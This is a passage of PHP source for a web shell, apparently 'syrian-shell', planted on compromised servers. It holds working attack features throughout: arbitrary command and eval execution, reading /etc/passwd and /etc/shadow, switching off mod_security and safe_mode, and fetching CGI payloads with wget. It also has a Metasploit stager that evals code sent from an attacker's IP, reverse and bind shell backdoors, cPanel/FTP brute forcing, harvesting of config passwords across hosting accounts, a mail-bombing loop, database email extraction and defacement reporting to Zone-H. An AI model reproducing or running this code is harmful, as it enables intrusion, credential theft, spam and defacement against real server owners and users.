<p dir=ltr><font color=#cccccc size=-2><b> &nbsp;&nbsp;".$server."
<br>&nbsp;&nbsp;".$uname." <sy><a href=http://www.google.com/search?q=".urlencode(@php_uname())." target=_blank>[Google]</a></sy><br>&nbsp;&nbsp;".

$dir."<br>&nbsp;&nbsp;".Exe('id')."</b>
</font></td></tr></tbody>
</table>
&nbsp;&nbsp;[<a href='#down'>Down</a>]
 [<a href='javascript:window.print()'>Print</a>]
</table>";

# ---------------------------------------#
#                Main Page               #
#----------------------------------------#
if ($_GET['id']== 'mainPage')
{
	echo "<form method='post'><table width=100% border=1><tr><td>
	<textarea name='ExecutionArea' rows=10 cols=152 style='color=red'>";

	if(!$_POST || $_POST['login']) // Show Current Directory Contents if No Post in requesting ... 
	{
		@chdir($_POST['directory']);
		if($os == "Windows")
		{
			echo Exe('dir');
		}
		else if($os == "Linux")
		{
			echo Exe('ls');
		}
	}
	else if($_POST['submitCommands']) // Execute The Alias Command .
		{
			echo Exe($_POST['alias']);
		}
	else if($_POST['Execute']) // Execute The Command From Command Line  .
		{
			@chdir($_POST['directory']);
			if(empty($_POST['cmd']))
			{
				if($os == "Windows")
				{
					echo Exe('dir');
				}
				else if($os == "Linux")
				{
					echo Exe('ls -lia');
				}
			}
			else
			{
				echo Exe($_POST['cmd']);
			}
		}
		else if($_POST['submitEval']) // Execute Eval Code .
		{
			$eval = @str_replace("<?php","",$_POST['php_eval']);
			$eval = @str_replace("<?php","",$eval);
			$eval = @str_replace("?>","",$eval);
			$eval = @str_replace("\\","",$eval);
			echo eval($eval);
		}
		# --------------------------
		#   Hash Analyzer        
		#---------------------------
		else if($_POST['analyzieNow'])
		{
			$hash = $_POST['hashToAnalyze'];
			$subHash = substr($hash,0,3);
			if($subHash =='$ap' && strlen($hash) == 37)
			{
				echo "The Hash : ".$hash." is : MD5(APR) Hash";
			}
			else if($subHash =='$1$' && strlen($hash) == 34)
			{
				echo "The Hash : ".$hash." is : MD5(UNIX) Hash";
			}
			else if($subHash =='$H$' && strlen($hash) == 35)
			{
				echo "The Hash : ".$hash." is : MD5(phpBB3) Hash";
			}
			else if(strlen($hash) == 29)
			{
				echo "The Hash : ".$hash." is : MD5(Wordpress) Hash";
			}
			else if($subHash =='$5$' && strlen($hash) == 64)
			{
				echo "The Hash : ".$hash." is : SHA256(UNIX) Hash";
			}
			else if($subHash =='$6$' && strlen($hash) == 128)
			{
				echo "The Hash : ".$hash." is : SHA512(UNIX) Hash";
			}
			else if(strlen($hash) == 56)
			{
				echo "The Hash : ".$hash." is : SHA224 Hash";
				}
			else if(strlen($hash) == 64)
			{
				echo "The Hash : ".$hash." is : SHA256 Hash";
				}
			else if(strlen($hash) == 96)
			{
				echo "The Hash : ".$hash." is : SHA384 Hash";
			}
			else if(strlen($hash) == 128)
			{
				echo "The Hash : ".$hash." is : SHA512 Hash";
			}
			else if(strlen($hash) == 40)
			{
				echo "The Hash : ".$hash." is : MySQL v5.x Hash";
			}
			else if(strlen($hash) == 16)
			{
				echo "The Hash : ".$hash." is : MySQL Hash";
			}
			else if(strlen($hash) == 13)
			{
				echo "The Hash : ".$hash." is : DES(Unix) Hash";
			}
			else if(strlen($hash) == 32)
			{
				echo "The Hash : ".$hash." is : MD5 Hash";
			}
			else if(strlen($hash) == 4)
			{
				echo "The Hash : ".$hash." is : [CRC-16]-[CRC-16-CCITT]-[FCS-16]";}
			else 
			{
				echo "Error : Can't Detect Hash Type";
			}
		}
		# --------------------------
		#  Show Users    
		#---------------------------
		else if($_POST['showUsers'])
		{
			function showUsers()
			{

				if($rows = Exe('cat /etc/passwd'))
				{
					echo $rows;
				}
				elseif($rows= Exe('cat /etc/domainalias'))
				{
					echo $rows;
				}
				elseif($rows= Exe('cat /etc/shadow')) 
				{
					echo $rows;
				}
				elseif($rows= Exe('cat /var/mail')) 
				{
					echo $rows;
				}
				elseif($rows= Exe('cat /etc/valiases')) 
				{
					echo $rows;
				}
				else { echo "[-] Can't Show Users :( ... Sorry ";}
			}
			showUsers();
		}
		# --------------------------
		#   Generate perl      
		#---------------------------
		else if($_POST['generatePel'])
		{
			@chdir($_POST["cgiperlPath"]);
			@mkdir("cgi", 0755);
			@chdir("cgi");
			Exe('wget http://www.syrian-shell.com/cgiPerl/cgiPerl.sy3.zip');
			Exe('unzip cgiPerl.sy3.zip');
			@unlink('cgiPerl.sy3.zip');
			@chmod("cgiPerl.sy3",0755);
			@chmod("compiler",0777);
			$cgi_h = fopen('.htaccess','w+');
			@fwrite($cgi_h,'AddHandler cgi-script .sy3');
			echo '
cgi.sy3 & .htaccess Has Been Created in [ cgi ]  Directory 
Password Is : sy34' ;
		}
		# --------------------------
		#   Generate Server   
		#---------------------------
		else if($_POST['generateSER'])
		{
			@chdir($_POST['ShourtCutPath']);
			@mkdir("allserver", 0755);
			@chdir("allserver");
			Exe("ln -s / allserver");
			GenerateFile(".htaccess","
			Options Indexes FollowSymLinks
			DirectoryIndex ssssss.htm
			AddType txt .php
			AddHandler txt .php");
			echo 'Now Go to allserver folder '.$_POST['ShourtCutPath'].'' ;
		}
		# --------------------------
		#   Change Mode 
		#---------------------------
		else if($_POST['changePermission'])
		{
			$ch_ok = @chmod($_POST['fileName'],$_POST['per']);
			if($ch_ok)
			echo "Permission Changed Successfully ! " ;
			else echo "Changing Is Not Allowed Or The File is not Exist !";
		}
		# --------------------------
		#   Generate Users
		#---------------------------
		else if($_POST['GenerateUsers'])
		{
			@chdir($_POST['usersPath']);
			@mkdir("users", 0755);
			@chdir('users');
			Exe('wget http://www.syrian-shell.com/usersAndDomains/users.rar');
			Exe('mv users.rar users.sy3');
			@chmod('users.sy3',0755 );
			$user_h = fopen('.htaccess','w+');
			fwrite($user_h,'AddHandler cgi-script .sy3');
			echo "users.sy3 & .htaccess Has Been Created in [ users ]  Directory" ;
		}
		# --------------------------
		#   Forbidden
		#---------------------------
		else if($_POST['generateForbidden'])
		{
			@chdir($_POST['forbiddenPath']);
			@mkdir('forbidden');
			@chdir('forbidden');
			$htaccess = fopen('.htaccess','w+');
			if($_POST['403'] == 'DirectoryIndex')
			{
				fwrite($htaccess,"DirectoryIndex in.txt");
			}
			elseif($_POST['403'] == 'HeaderName')
			{
				fwrite($htaccess,"HeaderName in.txt");
			}
			elseif($_POST['403'] == 'TXT')
			{
				fwrite($htaccess,"
				Options Indexes FollowSymLinks 
				addType txt .php 
				AddHandler txt .php");
			}
			elseif($_POST['403'] == '404')
			{
				fwrite($htaccess,"
				ErrorDocument 404 /404.html 
				404.html = Symlinked in.txt  ");
			}
			elseif($_POST['403'] == 'ReadmeName')
			{
				fwrite($htaccess,"ReadmeName in.txt");
			}
			elseif($_POST['403'] == 'footerName')
			{
				fwrite($htaccess,"footerName in.txt");
			}
			echo "
Now Go To [ forbidden ] Dir And Then make The Shortcut [ in.txt ]
EX : ln -s /home/user/public_html/config.php in.txt";
		}
		# --------------------------
		#   Upload Files
		#---------------------------
		else if($_POST['UploadNow'])
		{
			$nbr_uploaded =0;
			$files_uploded = array();
			$path= '';
			$target_path= $path . basename($_FILES['uploadfile']['name'][$i]);
			for ($i = 0; $i < count($_FILES['uploadfile']['name']); $i++)
			{
				if($_FILES['uploadfile']['name'][$i] != '')
				{
					move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $target_path . $_FILES['uploadfile']['name'][$i]);
					$files_uploded[] = $_FILES['uploadfile']['name'][$i];
					$nbr_uploaded++;
					echo "The File  ".basename($_FILES['uploadfile']['name'][$i])." Uploaded Successfully !
";
				}
				else "The File  ".basename($_FILES['uploadfile']['name'][$i])."  Can't Be Upload :( !";
			}
		}
		# --------------------------
		#   no Security
		#---------------------------
		else if($_POST['phpiniGenerate'])
		{
			GenerateFile("php.ini","
			safe_mode = Off
			disable_functions = NONE
			safe_mode_gid = OFF
			open_basedir = OFF");
			echo "php.ini Has Been Generated Successfully";
		}
		else if($_POST['htaccessGenerate'])
		{
			GenerateFile(".htaccess","
			<IfModule mod_security.c>
			SecFilterEngine Off
			SecFilterScanPOST Off
			SecFilterCheckURLEncoding Off
			SecFilterCheckCookieFormat Off
			SecFilterCheckUnicodeEncoding Off
			SecFilterNormalizeCookies Off
			</IfModule>
			SetEnv PHPRC ".getcwd()."php.ini
			suPHP_ConfigPath ".getcwd()."php.ini
			");
			echo ".htaccess Has Been Generated Successfully ";
		}
		else if($_POST['iniphpGenerate'])
		{
			GenerateFile("ini.php","
			ini_restore(\"safe_mode\");
			ini_restore(\"open_basedir\");
			");
			echo "ini.php Has Been Generated Successfully";
		}
		# --------------------------
		#  Reading Files
		#---------------------------
		else if($_POST['read'] || $_POST['show'])
		{
			$file = $_POST['file'];
			$file = str_replace('\\\\','\\',$file);
			
				if($_POST['read'])
				{
					$openMyFile = fopen($file,'r');
					if(function_exists('fread'))
					{
						echo fread($openMyFile,100000);	
					}
					elseif(function_exists('fgets'))
					{
						echo fgets($openMyFile);
					}
					elseif(function_exists('readfile'))
					{
						echo readfile($openMyFile);
					}
					elseif(function_exists('file_get_contents'))
					{
						$readMyFile = @file_get_contents($file, NULL, NULL, 0, 1000000);
						var_dump($readMyFile);
					}
					elseif(function_exists('file'))
					{
						$readMyFile = file($myFile); 
						foreach ($readMyFile as $line_num => $readMyFileLine) 
						{ 
							echo "Line #$line_num : " . $readMyFileLine . "
							"; 
						}
					}
					elseif(Exe("'cat ".$file."'"))
					{
						echo Exe("'cat ".$file."'");	
					}
				elseif(function_exists('readfile'))
				{
					readfile($file);
				}
				elseif(function_exists('include'))
				{
					include($file);	
				}
				elseif(function_exists('copy'))
				{
					$tmp=tempnam('','cx');
					copy('compress.zlib://'.$file,$tmp);
					$fh=fopen($tmp,'r');
					$data=fread($fh,filesize($tmp));
					fclose($fh);
					echo $data;
				}
				elseif(function_exists('mb_send_mail'))
				{
					if(file_exists('/tmp/mb_send_mail'))
					{
						unlink('/tmp/mb_send_mail');
					}
					@mb_send_mail(NULL, NULL, NULL, NULL,'-C $file -X /tmp/mb_send_mail');
					@readfile('/tmp/mb_send_mail');
				}
				else if(function_exists('curl_init'))
				{
					$fh=curl_init('file://'.$file.'');
					$tmp=curl_exec($fh);
					echo $tmp;
					if(strstr($file,DIRECTORY_SEPARATOR))
					$ch=curl_init('file:///'.$file."\x00/../../../../../../../../../../../../".__FILE__);
					else $ch=curl_init('file://'.$file."\x00".__FILE__);
					var_dump(curl_exec($ch));
				}
				else if(is_writable('.'))
				{
					file_put_contents('php.ini','safe_mode = Off');
					readfile($file);
					unlink('php.ini');
				}
				else if(is_object($ws=new COM('WScript.Shell')))
				{
					echo $exec=comshelL("type \"$file\"",$ws);
				}
				else if(checkfunctioN('win_shell_execute'))
				{
					echo winshelL("type \"$file\"");
				}
				else if(checkfunctioN('win32_create_service'))
				{
					echo srvshelL("type \"$file\"");
				}
				else if(function_exists('imap_open'))
				{
					$str=imap_open('/etc/passwd','','');
					$list=imap_list($str,$file,'*');
					for($i=0;$i<count($list);$i++)
					{
						echo $list[$i]."\n";
					}
					imap_close($str);
					$str=imap_open($file,'','');
					$tmp=imap_body($str,1);
					echo $tmp;
					imap_close($str);
				}
				elseif($file == '/etc/passwd')
				{
					for($uid=0;$uid<99999;$uid++)
					{
						$h=posix_getpwuid($uid);
						if(!empty($h))
						foreach($h as $v)
						echo "$v:";
						echo "\r\n";
					}
				}
				fclose($openMyFile);
			}
			elseif($_POST['show'])
			{
				$con=glob("$file*");
				foreach ($con as $v)
				{
					echo "$v\n";
				}
				if(function_exists('imap_open'))
				{
					$str=imap_open('/etc/passwd','','');
					$s=explode("|",$file);
					if(count($s)>1)
					{
						$list=imap_list($str,trim($s[0]),trim($s[1]));
					}
					else 
					{
						$list=imap_list($str,trim($str[0]),'*');
					}
					for($i=0;$i<count($list);$i++)
					{
						imap_close($str);
					}
				}
				else if(is_object($ws=new COM('WScript.Shell')))
				{
					$exec=comshelL("dir \"$file\"",$ws);
					$exec=str_replace("\t",'',$exec);
					echo $exec;
				}
				else if(checkfunctioN('win_shell_execute'))
				{
					echo winshelL("dir \"$file\"");
				}
				else if(checkfunctioN('win32_create_service'))
				{
					echo srvshelL("dir \"$file\"");
				}
			}
			
		}
		# --------------------------
		#   Encryption
		#---------------------------
		elseif($_POST['encryptNow'])
		{
			if(!empty($_POST['ENCRYPTION']))
			{
				$md5 = $_POST['ENCRYPTION'];
				echo "
MD5 			: ".md5($md5)."
Base64 Encode   	: ".base64_encode($md5)."
Base64 Decode   	: ".base64_decode($md5)."
Crypt 			: ".crypt($md5)."
SHA1 			: ".sha1($md5)."
MD4 			: ".hash("md4",$md5)."
SHA256 			: ".hash("sha256",$md5)."
URL Encoding 		: ".urlencode($md5)."
URL Decoding 		: ".str_hex($md5)."
CRC32 			: ".crc32($md5)."
Length 			: ".strlen($md5)."";
			}
			else
			{
				echo "Please Put At Least One Char !";
			}
		}
		# --------------------------
		#   Metasploit RC
		#---------------------------
		else if($_POST['metaConnect'])
		{
			$ip = $_POST['ip'];
			$port = $_POST['port'];
			if ($ip == "" && $port == "")
			{
				echo "Please fill IP Adress & The listen Port";
			} 
			else 
			{
				$ipaddr = $ip; 
				$port = $port;
				if (FALSE !== strpos($ipaddr, ":")) 
				{
					$ipaddr = "[". $ipaddr ."]";
				}
				if (is_callable('stream_socket_client')) 
				{
					$msgsock = @stream_socket_client("tcp://{$ipaddr}:{$port}");
					if (!$msgsock)
					{
						die(); 
					}
					$msgsock_type = 'stream';
				} 
				elseif (is_callable('fsockopen')) 
				{
					$msgsock = fsockopen($ipaddr,$port);
					if (!$msgsock) 
					{
						die(); 
					}
					$msgsock_type = 'stream';
				}
				elseif (is_callable('socket_create')) 
				{
					$msgsock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
					$res = socket_connect($msgsock, $ipaddr, $port);
					if (!$res) 
					{
						die(); 
					}
					$msgsock_type = 'socket';
				} 
				else 
				{
					die();
				}
				switch ($msgsock_type) 
				{ 
					case 'stream': $len = fread($msgsock, 4); break;
					case 'socket': $len = socket_read($msgsock, 4); break;
				}
				if (!$len) 
				{
					die();
				}
				$a = unpack("Nlen", $len);
				$len = $a['len'];
				$buffer = '';
				while (strlen($buffer) < $len) 
				{
					switch ($msgsock_type) 
					{ 
						case 'stream': $buffer .= fread($msgsock, $len-strlen($buffer)); 
						break;
						case 'socket': $buffer .= socket_read($msgsock, $len-strlen($buffer));
						break;
					}
				}
				eval($buffer);
				echo "[*] Connection Terminated";
				die();
			}
		}
		# --------------------------
		#  Scan Ports
		#---------------------------
		else if($_POST['submitDomainToScanPort'])
		{
			$domainToScan = $_POST['domainToScanPort'];
			if(!$domainToScan)
			{
				echo "[-] Enter IP Address Or Domain To Scan";
			}
			else 
			{
				for($i=0;$i<1024;$i++) 
				{
					$fp = @fsockopen($domainToScan,$i,$errno,$errstr,10);
					if($fp)
					{
						echo "[+] port " . $i . " open on " . $domainToScan . "
";
					}
					else
					{
						echo "[+] port " . $i . " closed on " . $domainToScan . "
";
					}
					flush();
				} 
				fclose($fp);
			}
		}
			
			if (isset($_POST["submit_lol"])) 
			{
				set_time_limit(0);
				$url = $_POST['hash_lol'];
				echo "Testing ".$url."\n";
				$extention = $_POST['extention'];
				$adminlocales = array(
"admin/",
"wp-admin/",
"administration/",
"administrator/",
"moderator/",
"webadmin/",
"adminarea/",
"bb-admin/",
"adminLogin/",
"admin_area/",
"panel-administracion/",
"instadmin/",
"memberadmin/",
"administratorlogin/",
"adm/",
"siteadmin/login".$extention."",
"admin/account".$extention."",
"admin/index".$extention."",
"admin/login".$extention."",
"admin/admin".$extention."",
"admin_area/login".$extention."",
"admin_area/index".$extention."",
"admincp/index".$extention."",
"adminpanel".$extention."",
"webadmin".$extention."",
"webadmin/index".$extention."",
"webadmin/login".$extention."",
"admin/admin_login".$extention."",
"admin_login".$extention."",
"panel-administracion/login".$extention."",
"admin_area/admin".$extention."",
"bb-admin/index".$extention."",
"bb-admin/login".$extention."",
"bb-admin/admin".$extention."",
"admin/home".$extention."",
"pages/admin/admin-login".$extention."",
"admin/admin-login".$extention."",
"admin-login".$extention."",
"admin/adminLogin".$extention."",
"home".$extention."",
"adminarea/index".$extention."",
"admin/controlpanel".$extention."",
"admin".$extention."",
"admin/cp".$extention."",
"cp".$extention."",
"adminpanel.php",
"moderator".$extention."",
"administrator/index".$extention."",
"administrator/login".$extention."",
"user".$extention."",
"administrator/account".$extention."",
"administrator".$extention."",
"login".$extention."",
"modelsearch/login".$extention."",
"moderator/login".$extention."",
"panel-administracion/admin".$extention."",
"admincontrol/login".$extention."",
"adm/index".$extention."",
"moderator/admin".$extention."",
"account".$extention."",
"controlpanel".$extention."",
"admincontrol".$extention."",
"webadmin/admin".$extention."",
"adminLogin".$extention."",
"panel-administracion/login".$extention."",
"wp-login".$extention."",
"adminLogin".$extention."",
"admin/adminLogin".$extention."",
"adminarea/index".$extention."",
"adminarea/admin".$extention."",
"adminarea/login".$extention."",
"panel-administracion/index".$extention."",
"modelsearch/index".$extention."",
"modelsearch/admin".$extention."",
"adm/admloginuser".$extention."",
"admloginuser".$extention."",
"admin2".$extention."",
"admin2/login".$extention."",
"admin2/index".$extention."",
"adm/index".$extention."",
"adm".$extention."",
"affiliate".$extention."",
"adm_auth".$extention."",
"memberadmin".$extention."",
"administratorlogin".$extention."");
				foreach ($adminlocales as $admin)
				{
					$headers = @get_headers("$url$admin");
					if (@eregi('200', $headers[0])) 
					{
						echo "[+] $url$admin  ~ Found!\n";
					}
					
				}
			}
		# --------------------------
		#   Config Finder
		#---------------------------
		else if($_POST['configFinderSubmit'])
		{
			set_time_limit(0); 
			$passwd=fopen('/etc/passwd','r'); 
			if (!$passwd)
			{ 
				echo "[-] Error : coudn't read /etc/passwd"; 
				exit; 
			} 
			$path_to_public=array(); 
			$users=array(); 
			$pathtoconf=array(); 
			$i=0; 
			while(!feof($passwd)) 
			{ 
				$str=fgets($passwd); 
				if ($i>35) 
				{ 
				   $pos=strpos($str,":"); 
				   $username=substr($str,0,$pos); 
				   $dirz="/home/$username/public_html/"; 
				   if (($username!="")) 
				   { 
					   if (is_readable($dirz)) 
					   { 
						   array_push($users,$username); 
						   array_push($path_to_public,$dirz); 
					   } 
				   } 
				} 
				$i++; 
			} 
			echo ""; 
			echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd
		"; 
			echo "[+] Founded ".sizeof($path_to_public)." readable public_html directories
		"; 
			echo "[~] Searching for passwords in config.* files...
		"; 
			foreach ($users as $user) 
			{ 
				   $path="/home/$user/public_html/"; 
				   read_dir($path,$user); 
			} 
			echo "[+] Done"; 
		}
		# --------------------------
		#   Mail Storm
		#---------------------------
		else if($_POST['sendMailStorm'])
		{
			$to=$_POST['to'];
			$nom=$_POST['nom'];
			$Comments=$_POST['Comments'];
			if ($to <> "" )
			{
				for ($i = 0; $i < $nom ; $i++)
				{
					$from = rand (71,1020000000)."@"."Attacker.com";
					$subject= md5("$from");
					if(@mail($to,$subject,$Comments,"From:$from"))
					echo "[+] $i spammed !!
";
					else 
					{
						echo "[-] $i Failed !! 
";
					}
				}
			}
		}
		# --------------------------
		#   Extract Emails				
		#---------------------------
		else if($_POST['getEmails'])
		{
			$emhost = $_POST['EM_HOST'];
			$emuser = $_POST['EM_USER'];
			$empass = $_POST['EM_PASS'];
			$emdb = $_POST['EM_DB'];
			$emtab = $_POST['EM_TABLE'];
			$emcol = $_POST['EM_COLUMN'];
			$try2Connect = @mysql_connect($emhost,$emuser,$empass);
			if(!$try2Connect) 
			{
				echo "[-] Can't Connect To DB !! [ user name || password is wrong ! ] .
";
			}
			$try2Select = @mysql_select_db($emdb);
			if(!$try2Select && $try2Connect) 
			{
				echo "[-] DB Name is Wrong !! . ";
			}
			$sql = @mysql_query("SELECT * FROM $emtab");
			while ($res = @mysql_fetch_array($sql))
			{
				echo ''.$res["$emcol"].'
';
			}
		}
		// Help 
		else if($_POST['emailExtractorHelp'])
		{
			echo "This is Some Tables Name & Columns Name For Some Fam Scripts ..

[+] VBulletin
Table-name : user
column-name : email

[+] WordPress 
Table-name : wp_users
column-name : user_email 

[+] Joomla 
Table-name : jos_users
column-name : email

[+] PHPBB 
Table-name : phpbb_users
column-name : user_email

[+] I.P.Board 
Table-name : ibf_members
column-name : email

[+] SMF 
Table-name : smf_members
column-name : emailAddress ";
		}
		# --------------------------
		#   MySQL Query
		#---------------------------
		else if($_POST['MySQLQuery'])
		{
			$qu_host =$_POST['QU_HOST'];
			$qu_user =$_POST['QU_USER'];
			$qu_pass =$_POST['QU_PASS'];
			$qu_db =$_POST['QU_DB'];
			$query =$_POST['QU'];
			if (empty($_POST['QU_HOST']))
			$qu_host = 'localhost';
			$query = str_replace("\\","",$query);
			if (!empty($_POST['QU']))
			{
				$tryConnection = @mysql_connect($qu_host,$qu_user,$qu_pass);
				if(!$tryConnection)
				{
					echo "[-] Unable TO Connect DATABASE ! Username Or Password Is Wrong !!";
				}
				else
				{
					$selectDB = @mysql_select_db($qu_db);
					if(!$selectDB)
					{
						echo "[-] Database Name Is Wrong !!";
					}
					else
					{
						$qqok1 = mysql_query($query);
						if(!$qqok1)
						{
							echo "[-] Can't Execute The Query";
						}
					}
				}
				@mysql_close();
			}
			if ($qqok1)
			{
				update(); 
			}
		}
			# --------------------------
			#   SQL Reader
			#---------------------------
			else if ($_POST['sql2Read'])
			{
				$host = $_POST['host'];
				$user = $_POST['user'];
				$pass = $_POST['pass'];
				$db = $_POST['db'];
				$unique = uniqid('N');
				$file = $_POST['file'];
				$file = str_replace('\\\\','\\',$file);
				$query = array(
				"CREATE TEMPORARY TABLE $unique (file LONGBLOB)",
				"LOAD DATA INFILE '".mysql_real_escape_string($file)."' INTO TABLE $unique",
				"SELECT * FROM $unique"
				);
				$connect = mysql_connect($host,$user, $pass);
				mysql_select_db($db,$connect);
				foreach($query as $Allqueries)
				{
					$mysqlQuery = mysql_query($Allqueries,$connect);
					while($line = @mysql_fetch_row($mysqlQuery))
					echo htmlspecialchars($line[0]);
					echo "\n";
				}
			}
			# --------------------------
			#   Edit File
			#---------------------------
			else if($_POST['editFileSubmit'])
			{
				$file2Edit = $_POST['editFile'];
				echo @file_get_contents($file2Edit);
			}
			else if($_POST['saveEditedFile'])
			{
				$fileName = $_POST['file2edit'];
				$newFile = $_POST['ExecutionArea'];
				$trytoGenerate = GenerateFile($fileName,$newFile);
				if($trytoGenerate)
				{
					echo "[+] File Saved !";
				}
				else 
				{
					echo "[-] Failed To Save File !!";	
				}
			}
			# --------------------------
			#   Zone H Attacker
			#---------------------------
			else if($_POST['SendNowToZoneH'])
			{
				ob_start();
				$sub = @get_loaded_extensions();
				if(!in_array("curl", $sub))
				{
					die('[-] Curl Is Not Supported !! ');
				}
			
				$hacker = $_POST['defacer'];
				$method = $_POST['hackmode'];
				$neden = $_POST['reason'];
				$site = $_POST['domain'];
				
				if (empty($hacker))
				{
					die ("[-] You Must Fill the Attacker name !");
				}
				elseif($method == "--------SELECT--------") 
				{
					die("[-] You Must Select The Method !");
				}
				elseif($neden == "--------SELECT--------") 
				{
					die("[-] You Must Select The Reason");
				}
				elseif(empty($site)) 
				{
					die("[-] You Must Inter the Sites List ! ");
				}
				$i = 0;
				$sites = explode("\n", $site);
				while($i < count($sites)) 
				{
					if(substr($sites[$i], 0, 4) != "http") 
					{
						$sites[$i] = "http://".$sites[$i];
					}
					ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
					echo "Site : ".$sites[$i]." Defaced !\n";
					++$i;
				}
				echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !! ";
			}
			# --------------------------
			#   FTP And Cpanle Brute Force Attacker
			#---------------------------
			else if($_POST['BruteForceCpanelAndFTP'])
			{
				$connect_timeout=5;
				set_time_limit(0);
				$submit=$_REQUEST['BruteForceCpanelAndFTP'];
				$users=$_REQUEST['users'];
				$pass=$_REQUEST['passwords'];
				$target=$_REQUEST['target'];
				$cracktype=$_REQUEST['cracktype'];
				
				if(empty($target))
				{
					$target = "localhost";
				}
				
				function ftp_check($host,$user,$pass,$timeout)
				{
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, "ftp://$host");
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
					curl_setopt($ch, CURLOPT_FTPLISTONLY, 1);
					curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
					curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
					curl_setopt($ch, CURLOPT_FAILONERROR, 1);
					$data = curl_exec($ch);
					if ( curl_errno($ch) == 28 ) 
					{
						 print "Error : Connection Timeout Please Check The Target Hostname .";
						 exit;
					}
					elseif ( curl_errno($ch) == 0 )
					{
						print "[+] Cracking Success With Username ($user) and Password ($pass)";
					}
					curl_close($ch);
				}
				function cpanel_check($host,$user,$pass,$timeout)
				{
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, "http://$host:2082");
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
					curl_setopt($ch, CURLOPT_USERPWD, "$user:$pass");
					curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
					curl_setopt($ch, CURLOPT_FAILONERROR, 1);
					$data = curl_exec($ch);
					if ( curl_errno($ch) == 28 ) 
					{ 
						print "[-] Connection Timeout Please Check The Target Hostname .";
						exit;
					}
					elseif ( curl_errno($ch) == 0 )
					{
						print "[+] Cracking Success With Username ($user) and Password ($pass)";
					}
					curl_close($ch);
				}
				if(isset($submit) && !empty($submit))
				{
					if(empty($users) && empty($pass))
					{ 
						print "[-] Please Check The Users or Password List Entry . . .";
					}
					if(empty($users))
					{ 
						print "[-] Please Check The Users List Entry . . ."; 
					}
					if(empty($pass))
					{ 
						print "[-] Please Check The Password List Entry . . ";
					}
					$userlist=explode("\n",$users);
					$passlist=explode("\n",$pass);
					print "[~]# Cracking Process Started, Please Wait ...";
					foreach ($userlist as $user) 
					{
						$pureuser = trim($user);
						foreach ($passlist as $password ) 
						{
							$purepass = trim($password);
							if($cracktype == "ftp")
							{
								ftp_check($target,$pureuser,$purepass,$connect_timeout);
							}
							if ($cracktype == "cpanel")
							{
								cpanel_check($target,$pureuser,$purepass,$connect_timeout);
							}
						}
					}
				}
			}
			# --------------------------
			#   Back Connection
			#---------------------------
			else if($_POST['backconn'])
			{
				if (!empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'C'))
				{ 
					$ip = trim($_POST['ip']); 
					$port = trim($_POST['backport']); 
					tulis("bcc.c",$back_connect_c); 
					Exe('gcc -o bcc bcc.c'); 
					Exe('chmod 777 bcc'); 
					@unlink('bcc.c'); 
					Exe("./bcc ".$ip." ".$port." &"); 
					$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
				} 
				elseif (!empty($_POST['backport']) && !empty($_POST['ip']) && ($_POST['use'] == 'Perl')) 
				{ 
					$ip = trim($_POST['ip']);
					$port = trim($_POST['backport']);
					tulis("bcp",$back_connect);
					Exe("chmod +x bcp"); 
					$p2=which("perl");
					Exe($p2." bcp ".$ip." ".$port." &");
					$msg = "Now script try connect to ".$ip." port ".$port." ..."; 
				} 
			}
			# --------------------------
			#   Bind Connection
			#---------------------------
			else if($_POST['bind'])
			{
				if (!empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'C')) 
				{ 
					$port = trim($_POST['port']); 
					$passwrd = trim($_POST['bind_pass']); 
					tulis("bdc.c",$port_bind_bd_c); 
					Exe('gcc -o bdc bdc.c'); 
					Exe('chmod 777 bdc'); 
					@unlink("bdc.c"); 
					Exe("./bdc ".$port." ".$passwrd." &"); 
					$scan = Exe("ps aux"); 
					if(eregi("./bdc $por",$scan))
					{ 
						$msg = "Process found running, backdoor setup successfully."; 
					} 
					else 
					{ 
						$msg = "Process not found running, backdoor not setup successfully."; 
					} 
				} 
				
				elseif (!empty($_POST['port']) && !empty($_POST['bind_pass']) && ($_POST['use'] == 'Perl')) 
				{ 
					$port = trim($_POST['port']); 
					$passwrd = trim($_POST['bind_pass']); 
					tulis("bdp",$port_bind_bd_pl); 
					Exe("chmod 777 bdp"); 
					$p2=which("perl"); 
					Exe($p2." bdp ".$port." &"); 
					$scan = Exe("ps aux"); 
					if(eregi("$p2 bdp $port",$scan))
					{ 
						$msg = "Process found running, backdoor setup successfully."; 
					} 	
					else 
					{ 
						$msg = "Process not found running, backdoor not setup successfully."; 
					} 
				} 	
			}

		
	echo "</textarea>";
	if($_POST['editFileSubmit'])
	{
		echo "<input type='hidden' value='".$_POST['editFile']."' name='file2edit' /> ";
		echo "<input type='submit' value='Save' name='saveEditedFile'>";
	}
	echo "</form>

	<!-- Main Table -->
	<table width='100%'><tr>
	<td width='30%' height=30>
	<!-- End Of Main Table -->
	<!-- Commands Alias-->
	<form method=POST><table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Commands Alias </td></tr><tr><td height='45' colspan='2'>";SelectCommand($os); echo "<input 

name='submitCommands' type='submit' value='ExecuteCommand'></td></tr></table></form>
	<!-- End Of Commands Alias-->
	</td>
	<td width='30%' height=30>
	<!-- Command Line -->
	<form method='POST'>
	<table width='100%' height='72' border='0'  id='Box'><tr>
    <td width='12' height='21' style='background-color:".$shellColor."'>&nbsp;</td>
    <td style='background-color:#666;padding-left:10px;'>Command Line </td></tr><tr><td height='45' colspan='2'>
	<input type='text' name='cmd' id='commandLine' value='dir' size=59>
	<input type='text' name='directory' value=".getcwd()." size=59>
	<input name='Execute' id='Execute' type='submit' value='Execute' >
